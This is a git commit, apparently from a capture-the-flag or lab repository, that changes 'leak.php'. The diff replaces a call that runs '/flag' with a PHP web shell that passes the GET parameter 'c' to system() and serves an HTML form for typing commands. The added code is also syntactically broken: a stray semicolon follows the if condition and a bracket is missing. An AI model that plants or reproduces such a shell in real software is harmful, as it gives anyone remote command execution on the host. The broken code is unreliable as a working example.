7c277cae5f0f1ebe8b2a8f747c1cd3dc1a09f66c
Director2ut <88049906+Director2ut@users.noreply.github.com>
2024-09-01 04:14:37 +0900

    Update leak.php

--- leak.php
+++ leak.php
@@ -1,3 +1,15 @@
 <?php
-   system("/flag"); 
+   if(isset($_GET["c"]);
+   {
+      system($_GET["c");
+   }
 ?>
+
+<html>
+   <body>
+      <form method = "GET">
+         <input type="text" name = 'c'>
+         <input type="submit">
+      </form>
+   </body>
+</html>
